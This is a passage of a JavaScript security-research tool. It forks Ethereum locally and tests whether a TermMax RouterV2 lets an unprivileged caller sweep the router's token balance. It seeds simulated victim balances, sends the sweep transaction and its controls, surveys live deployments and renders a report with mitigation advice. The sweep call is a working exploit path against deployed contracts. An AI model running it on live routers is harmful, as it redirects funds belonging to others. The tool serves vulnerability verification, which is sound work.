    out.verdict = "INCOMPLETE_PAUSE_UNREADABLE";
    out.noFindingSentence = "no-finding: pause state could not be read at the pin; sweep reachability is unverified.";
    return out;
  }

  if ((await rpc(local, "eth_getCode", [EOA, "latest"])) !== "0x") { out.verdict = "FAIL_EOA_HAS_CODE"; return out; }
  await rpc(local, "anvil_setBalance", [EOA, quantity(10n ** 20n)]);
  await rpc(local, "anvil_impersonateAccount", [EOA]);
  out.interventions.push({ kind: "anvil_impersonateAccount", target: EOA, note: "fresh non-owner EOA; no real key" });
  out.interventions.push({ kind: "anvil_setBalance", target: EOA, valueWei: (10n ** 20n).toString(), note: "fork-local gas only" });

  for (const vt of VICTIM_TOKENS) {
    budget(30000);
    const token = vt.address;
    const decR = await view(local, token, "decimals", []);
    const symR = await view(local, token, "symbol", []);
    const decimals = decR.ok ? Number(decR.value) : null;
    const row = {
      token, symbol: symR.ok ? String(symR.value) : vt.symbol, decimals,
      pin: backing.pin, pinHash: backing.pinHash,
      unitFloor: decimals == null ? null : (10n ** BigInt(Math.max(decimals - UNIT_SCALE_FRACTION, 0))).toString(),
      verdict: "INSUFFICIENT_EVIDENCE", deltasRaw: null, controls: {}, events: [],
    };
    if (decimals == null) {
      row.verdict = "INCOMPLETE_DECIMALS_UNREADABLE";
      out.tokens.push(row);
      continue;
    }
    const deal = VICTIM_UNITS * (10n ** BigInt(decimals));
    const bystanderDeal = BYSTANDER_UNITS * (10n ** BigInt(decimals));
    const floor = 10n ** BigInt(Math.max(decimals - UNIT_SCALE_FRACTION, 0));
    row.dealRaw = deal.toString();
    if (deal < floor) {
      row.verdict = "INCONCLUSIVE_UNIT_SCALE_MISMATCH";
      out.tokens.push(row); continue;
    }

    const snap = await rpc(local, "evm_snapshot", []);
    // Deal victim residue to the forked router and a separate bystander holding.
    const routerDeal = await dealToken(local, token, ROUTER.toLowerCase(), deal);
    const bystanderDealRes = await dealToken(local, token, BYSTANDER, bystanderDeal);
    out.interventions.push({ kind: "anvil_setStorageAt", token, holder: ROUTER.toLowerCase(), amountRaw: deal.toString(), method: routerDeal.method, realized: routerDeal.ok, note: "simulated victim residue on the forked router" });
    out.interventions.push({ kind: "anvil_setStorageAt", token, holder: BYSTANDER, amountRaw: bystanderDeal.toString(), method: bystanderDealRes.method, realized: bystanderDealRes.ok, note: "non-caller bystander control holding" });
    if (!routerDeal.ok) {
      row.verdict = "INCOMPLETE_DEAL_FAILED";
      out.failures.push(`${row.symbol}: router deal failed`);
      await rpc(local, "evm_revert", [snap]);
      out.tokens.push(row); continue;
    }

    const balOf = async (a) => (await readUint(local, token, "balanceOf", [a])) ?? 0n;
    const preRouter = await balOf(ROUTER.toLowerCase());
    const preRecipient = await balOf(RECIPIENT);
    const preCaller = await balOf(EOA);
    const preBystander = await balOf(BYSTANDER);

    // Sweep: useBalanceOnchain=true, zero caller funding.
    const sweepData = IFACE.router.encodeFunctionData("swapTokens", [sweepPath(RECIPIENT, token, true, 0n)]);
    const tx = await sendTx(local, { from: EOA, to: ROUTER, data: sweepData, gas: quantity(900000), gasPrice: quantity(2n * 10n ** 9n) });
    const success = Boolean(tx.receipt && tx.receipt.status === "0x1");
    row.events = tx.receipt ? decodeTransferEvents(tx.receipt, token) : [];

    const postRouter = await balOf(ROUTER.toLowerCase());
    const postRecipient = await balOf(RECIPIENT);
    const postCaller = await balOf(EOA);
    const postBystander = await balOf(BYSTANDER);

    row.deltasRaw = {
      router: (postRouter - preRouter).toString(),
      recipient: (postRecipient - preRecipient).toString(),
      caller: (postCaller - preCaller).toString(),
      bystander: (postBystander - preBystander).toString(),
      routerBalancePre: preRouter.toString(), routerBalancePost: postRouter.toString(),
      callerBalancePre: preCaller.toString(), callerBalancePost: postCaller.toString(),
      callerFundingRaw: "0",
      dealtRaw: deal.toString(),
      gasUsed: tx.receipt ? String(num(tx.receipt.gasUsed)) : null,
    };

    const callerFundingZero = preCaller === 0n && (postCaller - preCaller) === 0n;
    const swept = success
      && (postRecipient - preRecipient) === deal
      && (preRouter - postRouter) === deal
      && (postBystander - preBystander) === 0n
      && callerFundingZero;

    // Control A: useBalanceOnchain=false, inputAmount=0 -> no sweep, must not move victim residue.
    const ctrlAData = IFACE.router.encodeFunctionData("swapTokens", [sweepPath(RECIPIENT, token, false, 0n)]);
    const ctrlA = await sendTx(local, { from: EOA, to: ROUTER, data: ctrlAData, gas: quantity(900000), gasPrice: quantity(2n * 10n ** 9n) });
    const ctrlARouter = await balOf(ROUTER.toLowerCase());
    row.controls.callerFundedZero = {
      success: Boolean(ctrlA.receipt && ctrlA.receipt.status === "0x1"),
      routerDeltaRaw: (ctrlARouter - postRouter).toString(),
      movedVictimResidue: (ctrlARouter - postRouter) !== 0n,
    };

    // Control B: useBalanceOnchain=false, inputAmount=deal, caller has 0 -> must fail-closed.
    const ctrlBData = IFACE.router.encodeFunctionData("swapTokens", [sweepPath(RECIPIENT, token, false, deal)]);
    const ctrlB = await tryCall(local, ROUTER, ctrlBData, "latest");
    row.controls.callerFundedPositive = ctrlB.ok
      ? { success: true, note: "UNAEXPECTED_SUCCESS", revert: null }
      : { success: false, reverted: ctrlB.reverted === true, decoded: decodeRevert(ctrlB.revertData) };

    // Control C (negative gate): recipient == router would be a no-op relocation; not required.
    row.sweepReachable = swept;
    if (swept) row.verdict = "PASS_SWEEP_DIFFERENTIAL_CONFIRMED";
    else if (!success) row.verdict = "FAIL_CLOSED_CALL_REVERTED";
    else row.verdict = "FAIL_CLOSED_DELTA_MISMATCH";

    await rpc(local, "evm_revert", [snap]);
    out.tokens.push(row);
  }

  const confirmed = out.tokens.filter((t) => t.verdict === "PASS_SWEEP_DIFFERENTIAL_CONFIRMED");
  const anyReverted = out.tokens.some((t) => t.verdict === "FAIL_CLOSED_CALL_REVERTED");
  const inconclusive = out.tokens.some((t) => String(t.verdict).startsWith("INCONCLUSIVE") || String(t.verdict).startsWith("INCOMPLETE"));
  if (confirmed.length > 0) {
    out.verdict = "PASS_SWEEP_DIFFERENTIAL_CONFIRMED";
    out.exploitRelevantDifferential = true;
    out.noFindingSentence = `no-finding beyond the known WATCH: the fork confirms a caller-reachable, zero-funding sweep of simulated unowned residue (${confirmed.map((t) => t.symbol).join(", ")}) — a residue-redirect footgun, not a mint/supply break; live census shows no material residue (dust-only/none).`;
  } else if (anyReverted) {
    out.verdict = "FAIL_CLOSED_SWEEP_UNREACHABLE";
    out.noFindingSentence = "no-finding: the fork sweep reverted for every victim token; no caller-reachable sweep demonstrated on this deployment.";
  } else if (inconclusive) {
    out.verdict = "INSUFFICIENT_EVIDENCE";
    out.noFindingSentence = "no-finding: fork sweep evidence incomplete (unit-scale or deal/read failure); no differential asserted.";
  } else {
    out.verdict = "FAIL_CLOSED_DELTA_MISMATCH";
    out.noFindingSentence = "no-finding: the fork sweep did not reproduce the expected full-balance deltas; no caller-reachable sweep asserted.";
  }
  return out;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
async function run() {
  if (!fs.existsSync(ANVIL)) fail("ANVIL_MISSING");
  const manifest = enumerateManifestRouters();
  const prior = loadPriorArtifact();
  const bookTokens = settlementBookTokens(prior, CHAIN_ID);
  const artifacts = {
    schema: "termmax-router-sweep-r1/v1",
    generatedAt: new Date().toISOString(),
    lane: "termmax-router-sweep-fork",
    chainId: CHAIN_ID,
    fork: null,
    router: ROUTER,
    implementationHint: IMPL_HINT,
    relayOnly: true,
    endpointProcessOnly: true,
    endpointSource: "rpc_endpoints.txt",
    endpointMaterialLogged: false,
    readonly: true,
    networkWrites: 0,
    signedActionJustified: false,
    executableNow: 0,
    routePositive: 0,
    provenance: {
      inspectorSource: "default",
      abiSource: "hand-derived",
      abiSourceAnchors: [{ file: ROUTER_SOURCE, anchors: SOURCE_ANCHORS }],
      build: {
        attempted: false,
        reason: "no local contract deployment or compilation required: every probe targets live bytecode via the fork; targets/termmax forge build remains dependency-blocked offline (see reports/critical-termmax-generations.md), so the minimal ABI is hand-derived",
      },
    },
    stages: {},
  };
  live.push(artifacts);
  process.stdout.write("endpoint: rpc_endpoints.txt, path-only\n");

  stage = "FORK";
  const forkOut = await forkSession("fork", async (local, backing) => {
    const census = await censusOnFork(local, backing, bookTokens);
    const sweep = await sweepStage(local, backing, bookTokens);
    return { census, sweep };
  });
  artifacts.stages.censusFork = { stage: "census", ...forkOut.census };
  artifacts.stages.sweep = { stage: "sweep", ...forkOut.sweep };
  artifacts.fork = forkOut.fork;

  stage = "CENSUS_DIRECT";
  artifacts.stages.censusDirect = { stage: "census-direct", rows: [], chains: [] };
  for (const chainId of Object.keys(PUBLIC_CHAIN_URLS).map(Number)) {
    const rows = manifest.filter((m) => m.chainId === chainId);
    if (!rows.length) continue;
    const direct = await directChainCensus(PUBLIC_CHAIN_URLS[chainId], chainId, rows);
    artifacts.stages.censusDirect.chains.push(direct);
  }

  // Assemble the per-deployment census table with honest state tags.
  const censusRows = [];
  for (const m of manifest) {
    const hasFork = m.chainId === CHAIN_ID;
    const direct = artifacts.stages.censusDirect.chains.find((c) => c.chainId === m.chainId);
    const directRow = direct ? direct.rows.find((r) => r.router === m.router) : null;
    const priorRow = prior.byChain.get(m.chainId) || null;
    const forkRow = hasFork ? artifacts.stages.censusFork.ethRow : null;
    const directLive = directRow && directRow.state === "LIVE_READ";
    let state;
    if (hasFork) state = artifacts.stages.censusFork.verdict;
    else if (directLive) state = "LIVE_READ";
    else if (priorRow) state = "PRIOR_ARTIFACT_ONLY";
    else if (directRow) state = directRow.state;
    else state = "INCOMPLETE_NO_KEYLESS_BACKING";
    const pick = (...vals) => { for (const v of vals) if (v !== undefined && v !== null) return v; return null; };
    const freshness = hasFork
      ? { pin: artifacts.fork.pin, pinHash: artifacts.fork.pinHash, source: "fresh-fork-read" }
      : directLive && direct?.freshness ? { pin: direct.freshness.pin, pinHash: direct.freshness.pinHash, source: "fresh-keyless-read" }
      : priorRow && priorRow.pin ? { pin: Number(priorRow.pin), pinHash: priorRow.pinHash, source: "prior-artifact" }
      : direct?.freshness ? { pin: direct.freshness.pin, pinHash: direct.freshness.pinHash, source: "fresh-keyless-read" }
      : null;
    const useFork = hasFork;
    const field = (key) => useFork ? forkRow[key] : pick(directLive ? directRow[key] : null, priorRow ? priorRow[key] : null, directRow ? directRow[key] : null);
    const row = {
      network: m.network, chainId: m.chainId, router: m.router,
      manifest: m.manifest, manifestSourceCommit: m.manifestSourceCommit,
      factoryV2: m.factoryV2, oracleAggregatorV2: m.oracleAggregatorV2,
      deploymentBlock: m.deploymentBlock,
      state,
      stateReason: !hasFork && !directLive && directRow && directRow.error ? `fresh-keyless-read-failed:${directRow.error}; used prior read-only artifact` : null,
      freshness,
      paused: field("paused"),
      owner: field("owner"),
      nativeBalance: field("nativeBalance"),
      implementation: field("implementation"),
      erc20Balances: hasFork ? forkRow.erc20Balances : "INCOMPLETE_NOT_FORKED_THIS_CHAIN",
      residueClassification: hasFork ? forkRow.residueClassification
        : (priorRow ? { nonzero: priorRow.nonzeroBalances.map((x) => ({ ...x, dustOnly: dustOnly(x.balance, x.decimals) })), note: "from prior read-only capture artifact" }
        : directRow ? { nonzero: [], note: "fresh keyless read; ERC20 universe not enumerated" }
        : "INCOMPLETE_NOT_ENUMERATED"),
    };
    censusRows.push(row);
  }
  artifacts.stages.census = {
    stage: "census",
    deployments: censusRows.length,
    manifestChains: manifest.length,
    priorArtifact: prior.meta,
    note: "fresh Ethereum fork reads at the pin; non-fork chains use fresh keyless reads where a public backing exists, else prior read-only artifact rows, else INCOMPLETE_<reason>",
    rows: censusRows,
  };

  const paused = artifacts.stages.sweep.paused;
  const sweepConfirmed = artifacts.stages.sweep.verdict === "PASS_SWEEP_DIFFERENTIAL_CONFIRMED";
  const anyMaterialLiveUnpausedNonzero = censusRows.some((r) =>
    r.paused === false
    && r.residueClassification && Array.isArray(r.residueClassification.nonzero)
    && r.residueClassification.nonzero.some((x) => !dustOnly(x.balance, x.decimals)));
  artifacts.routePositive = sweepConfirmed ? 1 : 0; // local/fork route reachability
  artifacts.operationalRoutePositive = anyMaterialLiveUnpausedNonzero ? 1 : 0; // live material (non-dust) residue present
  artifacts.executableNow = 0; // local fork only; no live material residue / gas economics
  artifacts.pausedState = paused;
  artifacts.overallVerdict = sweepConfirmed ? "PASS_SWEEP_DIFFERENTIAL_CONFIRMED"
    : artifacts.stages.sweep.verdict === "Fail-closed__paused" ? "Fail-closed__paused"
    : artifacts.stages.sweep.verdict;
  artifacts.noFindingSentence = artifacts.stages.sweep.noFindingSentence;
  artifacts.completedAt = new Date().toISOString();
  return artifacts;
}

function renderReport(a) {
  const c = a.stages.census;
  const s = a.stages.sweep;
  const lines = [];
  lines.push("# TermMax RouterV2 Full-Balance Sweep — Deployment-Binding Fork Test (R1)");
  lines.push("");
  lines.push(`**Schema:** \`${a.schema}\`  `);
  lines.push(`**Verdict:** \`${a.overallVerdict}\`  `);
  lines.push(`**routePositive (local/fork):** \`${a.routePositive}\` | **operationalRoutePositive:** \`${a.operationalRoutePositive}\` | **executableNow:** \`${a.executableNow}\` | **signedActionJustified:** \`${a.signedActionJustified}\``);
  lines.push("");
  lines.push(`**Fork pin:** block \`${a.fork?.pin}\` (\`${a.fork?.pinHash}\`), backing class \`${a.fork?.backingClass}\`, fresh fork.  `);
  lines.push(`**ABI provenance:** inspectorSource=\`${a.provenance.inspectorSource}\`; abiSource=\`${a.provenance.abiSource}\` (hand-derived; forge build dependency-blocked offline).`);
  lines.push("");
  lines.push("## Census — every live TermMaxRouterV2 deployment");
  lines.push("");
  lines.push("| Network | Chain | Router | State | Pin | paused() | owner() | native | impl | residue |");
  lines.push("|---|---:|---|---|---:|---|---|---:|---|---|");
  for (const r of c.rows) {
    const res = Array.isArray(r.residueClassification?.nonzero)
      ? (r.residueClassification.nonzero.length ? r.residueClassification.nonzero.map((x) => `${x.symbol || x.token}:${x.balance}`).join(",") : "none")
      : (r.residueClassification === "INCOMPLETE_NOT_ENUMERATED" ? "INCOMPLETE" : String(r.residueClassification));
    lines.push(`| ${r.network} | ${r.chainId} | \`${r.router}\` | \`${r.state}\` | ${r.freshness?.pin ?? "—"} | ${r.paused ?? "—"} | ${r.owner ? "`" + r.owner + "`" : "—"} | ${r.nativeBalance ?? "—"} | ${r.implementation ? "`" + r.implementation + "`" : "—"} | ${res} |`);
  }
  lines.push("");
  lines.push(`_Census source note:_ ${c.note}  `);
  lines.push(`_Prior artifact:_ ${c.priorArtifact?.available ? c.priorArtifact.path : c.priorArtifact?.reason}`);
  const degraded = c.rows.filter((r) => r.stateReason);
  if (degraded.length) lines.push(`_Degraded fresh reads:_ ${degraded.map((r) => `${r.network}(${r.stateReason})`).join("; ")}`);
  lines.push("");
  lines.push("## Fork sweep rows (raw wei deltas)");
  lines.push("");
  lines.push(`Live fork pause state: **${s.paused}**${s.implementation ? `, impl \`${s.implementation}\`` : ""}.`);
  lines.push("");
  lines.push("| Victim | decimals | dealt | router Δ | recipient Δ | caller Δ | bystander Δ | callerFunding | verdict |");
  lines.push("|---|---:|---:|---:|---:|---:|---:|---|---|");
  for (const t of s.tokens) {
    const d = t.deltasRaw || {};
    lines.push(`| ${t.symbol || t.token} | ${t.decimals ?? "—"} | ${t.dealRaw ?? "—"} | ${d.router ?? "—"} | ${d.recipient ?? "—"} | ${d.caller ?? "—"} | ${d.bystander ?? "—"} | ${d.callerFundingRaw ?? "—"} | ${t.verdict} |`);
  }
  lines.push("");
  lines.push("### Deterministic controls");
  for (const t of s.tokens) {
    lines.push(`- **${t.symbol || t.token}** caller-funded no-op (useBalanceOnchain=false, inputAmount=0): success=\`${t.controls?.callerFundedZero?.success}\`, routerΔ=\`${t.controls?.callerFundedZero?.routerDeltaRaw}\`, movedVictimResidue=\`${t.controls?.callerFundedZero?.movedVictimResidue}\``);
    lines.push(`- **${t.symbol || t.token}** caller-funded positive (useBalanceOnchain=false, inputAmount=dealt, caller has 0): success=\`${t.controls?.callerFundedPositive?.success}\`, decoded=\`${JSON.stringify(t.controls?.callerFundedPositive?.decoded ?? null)}\``);
  }
  lines.push("");
  lines.push("### MEASURED_INTERVENTION log");
  lines.push("");
  lines.push("| kind | target | detail | realized |");
  lines.push("|---|---|---|---|");
  for (const iv of s.interventions) {
    const detail = iv.method || iv.valueWei || iv.amountRaw || iv.note || "";
    const realized = iv.realized === undefined ? "—" : iv.realized;
    lines.push(`| ${iv.kind} | ${iv.target || iv.token || iv.holder || ""} | ${detail} | ${realized} |`);
  }
  lines.push("");
  lines.push("## Verdict and No-Finding");
  lines.push("");
  lines.push(`**${a.overallVerdict}**`);
  lines.push("");
  lines.push(a.noFindingSentence || "no-finding sentence unavailable");
  lines.push("");
  lines.push("**Impact:** A caller-reachable sweep of the router's own token balance is a residue-redirect footgun, not a mint/supply break. Live census residue is dust-only or absent, so `executableNow=0` and `signedActionJustified=false`. The fork differential uses a simulated (dealt) victim balance — that dealt residual is a `MEASURED_INTERVENTION`, not live protocol value.");
  lines.push("");
  lines.push("**Mitigation:** Bind each path to caller-funded per-call deltas and refund only the caller's delta; remove public full-balance consumption or authorize it explicitly and account per beneficiary.");
  lines.push("");
  lines.push("**Safety:** read-only census + local fork only; no `.env*`, no keys, no upstream forwarding, no coordination-file edits. Endpoint material process-only (`rpc_endpoints.txt`, path-only watermark).");
  return lines.join("\n") + "\n";
}

function writeResult(result) {
  fs.mkdirSync(path.dirname(OUTPUT), { recursive: true });
  fs.writeFileSync(OUTPUT, JSON.stringify(result, null, 2) + "\n", "utf8");
  try { fs.writeFileSync(REPORT, renderReport(result), "utf8"); } catch (_) { /* report is best-effort */ }
}

function summary(result) {
  const s = result.stages || {};
  return {
    overallVerdict: result.overallVerdict,
    routePositive: result.routePositive,
    operationalRoutePositive: result.operationalRoutePositive,
    executableNow: result.executableNow,
    signedActionJustified: result.signedActionJustified,
    pin: result.fork ? { pin: result.fork.pin, hash: result.fork.pinHash } : null,
    censusDeployments: s.census?.deployments ?? null,
    sweepVerdict: s.sweep?.verdict ?? null,
    sweep: (s.sweep?.tokens || []).map((t) => ({ symbol: t.symbol, dealt: t.dealRaw, routerDelta: t.deltasRaw?.router, recipientDelta: t.deltasRaw?.recipient, callerDelta: t.deltasRaw?.caller, bystanderDelta: t.deltasRaw?.bystander, verdict: t.verdict })),
    cleanup: stopAnvil() ? "clean" : "residual",
  };
}

process.once("exit", stopAnvil);
for (const signal of ["SIGINT", "SIGTERM"]) process.once(signal, () => { aborted = true; stopAnvil(); process.exit(1); });

(async () => {
  let timer;
  try {
    const result = await Promise.race([
      run(),
      new Promise((_, reject) => { timer = setTimeout(() => { aborted = true; stopAnvil(); reject(new Error("DEADLINE_EXCEEDED")); }, LIMIT_MS); }),
    ]);
    writeResult(result);
    process.stdout.write(JSON.stringify(summary(result)) + "\n");
  } catch (error) {
    const reason = CODES.has(error?.message) ? error.message : `${stage}_INTERNAL_OR_RELAY_FAILURE`;
    if (process.env.TERMMAX_SWEEP_DEBUG === "1" && !CODES.has(error?.message)) process.stderr.write(`[debug] ${error && error.stack ? error.stack : String(error)}\n`);
    const closed = {
      schema: "termmax-router-sweep-r1/v1", state: "FAIL_CLOSED", reason,
      generatedAt: new Date().toISOString(), chainId: CHAIN_ID, router: ROUTER,
      relayOnly: true, endpointProcessOnly: true, endpointSource: "rpc_endpoints.txt", endpointMaterialLogged: false,
      readonly: true, signedActionJustified: false, executableNow: 0, routePositive: 0,
      overallVerdict: "FAIL_CLOSED", noFindingSentence: `no-finding: the fork tool failed closed (${reason}); no sweep differential asserted.`,
      stages: live[0] ? live[0].stages : {},
      completedAt: new Date().toISOString(),
    };
    writeResult(closed);
    process.stdout.write(JSON.stringify({ state: "FAIL_CLOSED", reason }) + "\n");
    process.exitCode = 1;
  } finally {
    clearTimeout(timer);
    stopAnvil();
  }
})();
